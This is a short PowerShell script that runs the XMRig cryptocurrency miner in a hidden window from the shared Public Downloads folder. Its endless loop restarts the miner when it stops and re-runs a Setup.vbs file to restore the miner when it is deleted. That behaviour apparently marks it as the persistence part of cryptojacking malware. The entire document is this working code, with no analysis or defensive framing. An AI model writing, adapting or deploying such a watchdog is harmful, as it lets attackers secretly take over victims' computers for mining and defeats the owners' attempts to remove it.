$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$xmrigProcessName = "xmrig"

function Start-CoinRun {
    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru -WindowStyle Hidden
    Write-Host "Started COINRUN.cmd silently."
}

# Initial check
if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe not found..."
    if (Test-Path $setupPath) {
        Write-Host "Running Setup.vbs to recover..."
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        while (!(Test-Path $xmrigPath)) {
            Write-Host "Waiting for xmrig.exe..."
            Start-Sleep -Seconds 3
        }
        Start-CoinRun
    } else {
        Write-Error "Setup.vbs not found at $setupPath"
    }
}

# Main loop
while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe deleted. Trying to recover..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            while (!(Test-Path $xmrigPath)) {
                Write-Host "Waiting for xmrig.exe to return..."
                Start-Sleep -Seconds 3
            }
            Start-CoinRun
        } else {
            Write-Error "Setup.vbs not found: $setupPath"
        }
    }

    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd exited. Restarting..."
        Start-CoinRun
    }

    $xmrigRunning = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
    if (-not $xmrigRunning) {
        Write-Warning "xmrig.exe stopped. Restarting coinrun.cmd..."
        Start-CoinRun
    } else {
        Write-Host "xmrig.exe is running."
    }

    Start-Sleep -Seconds 3
}
